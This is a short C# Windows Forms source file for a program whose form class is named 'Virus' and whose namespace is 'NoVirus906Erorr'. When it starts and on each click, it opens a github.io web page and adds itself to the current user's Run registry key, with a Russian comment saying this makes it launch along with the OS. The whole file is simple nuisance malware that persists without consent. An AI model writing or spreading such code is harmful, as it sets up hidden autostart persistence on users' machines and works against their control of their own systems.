using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NoVirus906Erorr
{
    public partial class Virus : Form
    {
        public Virus()
        {
            InitializeComponent();
            string target = "https://alekandrza14.github.io/Virus906...";
            System.Diagnostics.Process.Start(target);
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Добавить значение в реестр для запуска напару с ОС
            rkApp.SetValue("NoVirus906Erorr", Application.ExecutablePath.ToString());
        }

        private void Virus_Click(object sender, EventArgs e)
        {
            string target = "https://alekandrza14.github.io/Virus906...";
            System.Diagnostics.Process.Start(target);
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                // Добавить значение в реестр для запуска напару с ОС
                rkApp.SetValue("NoVirus906Erorr", Application.ExecutablePath.ToString());
        }
    }
}
